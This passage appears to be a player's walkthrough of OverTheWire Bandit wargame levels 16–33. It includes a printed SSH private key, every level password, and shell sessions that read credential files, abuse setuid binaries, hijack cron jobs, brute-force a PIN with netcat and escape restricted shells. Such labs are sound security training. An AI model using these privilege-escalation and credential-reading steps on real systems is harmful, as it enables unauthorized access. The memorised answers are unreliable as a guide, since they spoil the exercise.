+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+closed
+bandit16@bandit:~$
+
+
+bandit17:SSH_PRIVATE_KEY
+bandit17:xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn(/etc/bandit_pass/bandit17)
+
+
+Level 17:
+
+ssh -i level17 bandit17@bandit.labs.overthewire.org -p 2220
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to Steven or morla on
+irc.overthewire.org.
+
+bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
+xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+
+There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new
+
+bandit17@bandit:~$ ls
+passwords.new  passwords.old
+bandit17@bandit:~$ diff passwords.new passwords.old
+42c42
+< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+---
+> w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii
+
+bandit18:kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+
+Level 18:
+
+# ssh bandit18@bandit.labs.overthewire.org -p 2220 "bash --norc --noprofile"
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+id
+uid=11018(bandit18) gid=11018(bandit18) groups=11018(bandit18)
+
+
+pwd
+/home/bandit18
+cat readme
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+bandit19:IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+
+Level 19:
+
+To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.
+
+bandit19@bandit:~$ ./bandit20-do /bin/sh
+$ id
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
+$ cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+
+bandit20:GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+Level 20:
+
+There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
+
+bandit20@bandit:~$ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l localhost -p 60000 &
+[1] 14098
+bandit20@bandit:~$ ./suconnect 60000
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+bandit21:gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+Level 21:
+
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+bandit22:Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+Level 22:
+
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:~$ myname=$(whoami)
+bandit22@bandit:~$ echo $myname
+bandit22
+bandit22@bandit:~$ myname=bandit23
+bandit22@bandit:~$ echo $myname
+bandit23
+bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+bandit23:jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+Level 23:
+
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+Go to /var/spool/bandit24 and write the following script
+
+bandit23@bandit:/var/spool/bandit24$ cat script
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/cron/output.txt
+
+Wait for the cron job to get executed.
+
+bandit23@bandit:/tmp/cron$ cat output.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+bandit24:UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+Level 24:
+
+bandit24@bandit:/tmp/cron$ cat script.sh
+#!/bin/bash
+
+for i in {0000..9999};
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002
+
+
+
+bandit24@bandit:/tmp/cron$ ./script.sh > output.txt
+bandit24@bandit:/tmp/cron$ cat output.txt | grep -v "Wrong"
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+bandit25:uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+Level 25:
+Rescale the window and ssh into it to get a more option.
+Then once it gets opened in vi(Make sure to press v for it to get opened), try to execute or read any file as bandit26
+
+:e /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+:shell
+[No write since last change]
+bandit26@bandit:~$ id
+uid=11026(bandit26) gid=11026(bandit26) groups=11026(bandit26)
+bandit26@bandit:~$
+
+
+bandit26:5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+
+Level 26:
+
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do id
+uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+
+bandit27:3ba3118a22e93127a4ed485be72ef5ea
+
+Level 27:
+
+There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27.
+
+bandit27@bandit:/tmp/repo$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27-git@localhost's password:
+remote: Counting objects: 3, done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (3/3), done.
+bandit27@bandit:/tmp/repo$ ls
+repo
+bandit27@bandit:/tmp/repo$ cd repo
+bandit27@bandit:/tmp/repo/repo$ ls -la
+total 16
+drwxr-sr-x 3 bandit27 root 4096 Dec 23 13:28 .
+drwxr-sr-x 3 bandit27 root 4096 Dec 23 13:28 ..
+drwxr-sr-x 8 bandit27 root 4096 Dec 23 13:28 .git
+-rw-r--r-- 1 bandit27 root   68 Dec 23 13:28 README
+bandit27@bandit:/tmp/repo/repo$ cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+
+bandit28:0ef186ac70e04ea33b4c1853d2526fa2
+
+Level 28:
+
+There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.
+
+bandit28@bandit:/tmp/rep/repo$ git log
+commit edd935d60906b33f0619605abd1689808ccdd5ee
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    fix info leak
+
+commit c086d11a00c0648d095d04c089786efef5e01264
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    add missing data
+
+commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    initial commit of README.md
+bandit28@bandit:/tmp/rep/repo$ git checkout edd935d60906b33f061
+
+
+bandit28@bandit:/tmp/rep/repo$ git show edd935d60906b33f0619605abd1689808ccdd5ee
+commit edd935d60906b33f0619605abd1689808ccdd5ee
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    fix info leak
+
+diff --git a/README.md b/README.md
+index 3f7cee8..5c6457b 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+
+ - username: bandit29
+-- password: bbc96594b4e001778eee9975372716b2
++- password: xxxxxxxxxx
+
+bandit29:bbc96594b4e001778eee9975372716b2
+
+Level 29:
+
+There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29
+
+
+bandit29@bandit:/tmp/ripc/repo$ git show 208f463b5b3992906eabf23c562eda3277fea912
+commit 208f463b5b3992906eabf23c562eda3277fea912
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:51 2020 +0200
+
+    fix username
+
+diff --git a/README.md b/README.md
+index 2da2f39..1af21d3 100644
+--- a/README.md
++++ b/README.md
+@@ -3,6 +3,6 @@ Some notes for bandit30 of bandit.
+
+ ## credentials
+
+-- username: bandit29
++- username: bandit30
+
+So here the password for bandit30 will be same as that of bandit29.
+Lets give it a try. Nope I failed.
+
+Lets enumerate the machine for a bit and try to find something interesting.
+
+bandit29@bandit:/tmp/ripc/repo/.git$ cat packed-refs
+# pack-refs with: peeled fully-peeled
+bc833286fca18a3948aec989f7025e23ffc16c07 refs/remotes/origin/dev
+208f463b5b3992906eabf23c562eda3277fea912 refs/remotes/origin/master
+786d5bea2bd2dcbed2c8896a310c3c5306bc713c refs/remotes/origin/sploits-dev
+bandit29@bandit:/tmp/ripc/repo/.git$ git show bc833286fca18a3948aec989f7025e23ffc16c07
+commit bc833286fca18a3948aec989f7025e23ffc16c07
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:52 2020 +0200
+
+    add data needed for development
+
+diff --git a/README.md b/README.md
+index 1af21d3..39b87a8 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for bandit30 of bandit.
+ ## credentials
+
+ - username: bandit30
+-- password: <no passwords in production!>
++- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+
+bandit30:5b90576bedb2cc04c86a9e924ce42faf
+
+Level 30:
+
+There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.
+
+bandit30@bandit:/tmp/gg/repo/.git$ cat packed-refs
+# pack-refs with: peeled fully-peeled
+3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/master
+f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret
+bandit30@bandit:/tmp/gg/repo/.git$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
+47e603bb428404d265f59c42920d81e5
+
+bandit31:47e603bb428404d265f59c42920d81e5
+
+
+Level 31:
+
+There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.
+
+bandit31@bandit:/tmp/cam/repo$ rm .gitignore
+bandit31@bandit:/tmp/cam/repo$ ls
+key.txt.txt  README.md
+bandit31@bandit:/tmp/cam/repo$ ls -la
+
+bandit31@bandit:/tmp/cam/repo$ cat key.txt
+May I come in?
+
+bandit31@bandit:/tmp/cam/repo$ git push origin master
+Could not create directory '/home/bandit31/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password:
+Permission denied, please try again.
+bandit31-git@localhost's password:
+Counting objects: 3, done.
+Delta compression using up to 2 threads.
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 287 bytes | 0 bytes/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+remote: ### Attempting to validate files... ####
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote:
+remote: Well done! Here is the password for the next level:
+remote: 56a9bf19c63d650ce78e6ec0354ee45e
+remote:
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+
+bandit32:56a9bf19c63d650ce78e6ec0354ee45e
+
+
+Level 32:
+
+After all this git stuff its time for another escape. Good luck!
+
+We can escape the UPPERCASE shell using $0
+
+$0 is the name of the script itself
+
+>> id
+sh: 1: ID: not found
+>> ls
+sh: 1: LS: not found
+>> $0
+$ id
+uid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)
+
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+
+bandit33:c9c3199ddf4121b10cf581a98d51caee
+
+bandit33@bandit:~$ ls
+README.txt
+bandit33@bandit:~$ cat README.txt
+Congratulations on solving the last level of this game!
+
+At this moment, there are no more levels to play in this game. However, we are constantly working
+on new levels and will most likely expand this game with more levels soon.
+Keep an eye out for an announcement on our usual communication channels!
+In the meantime, you could play some of our other wargames.
+
+If you have an idea for an awesome new level, please let us know!
+
+
+Coool
